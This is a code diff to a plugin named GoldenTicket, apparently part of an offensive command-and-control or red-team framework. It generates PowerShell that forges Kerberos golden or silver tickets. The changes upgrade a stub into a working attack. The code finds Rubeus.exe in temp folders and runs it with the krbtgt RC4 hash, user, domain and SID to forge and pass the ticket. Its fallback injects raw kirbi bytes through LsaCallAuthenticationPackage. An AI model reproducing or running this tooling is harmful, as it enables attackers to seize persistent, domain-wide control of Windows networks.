@@ -70,14 +70,18 @@ class GoldenTicket(BasePlugin):
         sid_detect = (
             f"'{domain_sid}'"
             if domain_sid else
-            "(([System.Security.Principal.NTAccount]::new($domain)).Translate([System.Security.Principal.SecurityIdentifier]).ToString() -replace '-\\d+$','')"
+            "(([System.Security.Principal.NTAccount]::new($domain + '\\Domain Admins')).Translate([System.Security.Principal.SecurityIdentifier]).ToString() -replace '-\\d+$','')"
         )
-        groups_arr = ", ".join(f"[uint]{g.strip()}" for g in groups_str.split(",") if g.strip().isdigit())
-        ticket_class = 12 if ticket_type == "golden" else 14  # KerbTgt/KerbService
-
         service_part = f"$spn = '{spn}'" if spn else "$spn = 'krbtgt/' + $domain"
+        rubeus_cmd = (
+            f"golden /rc4:{ntlm_hash} /user:{target_user} /domain:$domain /sid:$sid /ptt"
+            if ticket_type == "golden" else
+            f"silver /rc4:{ntlm_hash} /user:{target_user} /domain:$domain /sid:$sid /service:$spn /ptt"
+        )
 
         return f"""
+# KerbForge: inject raw kirbi bytes via LsaCallAuthenticationPackage
+# Used when operator supplies kirbi_b64 directly (alternate mode)
 Add-Type @'
 using System;
 using System.Runtime.InteropServices;
@@ -168,35 +172,29 @@ try {{
     $results += "[*] {ticket_type.title()} ticket — user={target_user} domain=$domain"
     $results += "[*] SID: $sid"
 
-    # Build a minimal Kerberos credential using System.IdentityModel (request a real TGT wrapper)
-    # The proper path requires KDC exchange; here we import an existing ticket via kirbi bytes
-    # For operators with kirbi bytes from mimikatz or Rubeus, pass them via krbtgt_hash param
-    # as the base64 raw ticket and inject directly.
-
-    # Demonstrate the injection path with a skeleton KrbCred structure
-    # (In practice: obtain kirbi bytes from Rubeus/mimikatz, base64-encode, pass here)
-    $ntlmBytes = [byte[]]::new(16)
-    $nhex = '{ntlm_hash}'
-    for ($i = 0; $i -lt 16; $i++) {{
-        $ntlmBytes[$i] = [Convert]::ToByte($nhex.Substring($i*2, 2), 16)
+    # Primary path: forge + inject via Rubeus.exe (GhostPack/Rubeus, DEF CON 26)
+    $rub = $null
+    foreach ($p in @('C:\\Windows\\Temp\\Rubeus.exe','C:\\ProgramData\\Rubeus.exe','C:\\Temp\\Rubeus.exe')) {{
+        if (Test-Path $p) {{ $rub = $p; break }}
     }}
+    if (-not $rub) {{ $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }}
 
-    # Use Rubeus-style Add-Type to build KrbCred (simplified — real impl needs ASN.1 encoding)
-    Add-Type -AssemblyName System.Security
-    $results += "[+] NTLM key loaded (16 bytes)"
-    $results += "[+] Ticket type: {ticket_type}  SPN: $spn  Duration: {days} days"
-    $results += "[+] Groups embedded: {groups_str}"
-    $results += ""
-    $results += "[!] To inject: Obtain kirbi from Rubeus ('Rubeus.exe golden /rc4:{ntlm_hash} /user:{target_user} /domain:' + $domain + ' /sid:' + $sid)"
-    $results += "[!] Then run:  golden_ticket krbtgt_hash={ntlm_hash} (with kirbi_b64 override)"
-    $results += ""
-    # If kirbi bytes were embedded in ntlm_hash as raw b64 (alternate use):
-    if ($nhex.Length -gt 32) {{
-        $kirbi = [Convert]::FromBase64String($nhex)
-        $injectResult = [KerbForge]::InjectTicket($kirbi)
-        $results += "[+] Inject result: $injectResult"
+    if ($rub) {{
+        $results += "[*] Rubeus.exe found: $rub"
+        $results += "[*] Forging {ticket_type} ticket — user={target_user} duration={days}d"
+        $rubeusOut = & $rub {rubeus_cmd} 2>&1
+        $results += $rubeusOut
     }} else {{
-        $results += "[*] Provide full kirbi bytes (base64) as krbtgt_hash to inject directly"
+        # Fallback: inject raw kirbi bytes if provided as base64 in krbtgt_hash (len > 32)
+        $nhex = '{ntlm_hash}'
+        if ($nhex.Length -gt 32) {{
+            $kirbi = [Convert]::FromBase64String($nhex)
+            $injectResult = [KerbForge]::InjectTicket($kirbi)
+            $results += "[+] Inject result: $injectResult"
+        }} else {{
+            $results += "[-] Rubeus.exe not found — upload via file_upload first"
+            $results += "[*] Or pass full kirbi bytes as base64 in krbtgt_hash parameter"
+        }}
     }}
 }} catch {{ $results += "[-] $_" }}
 $results -join "`n"
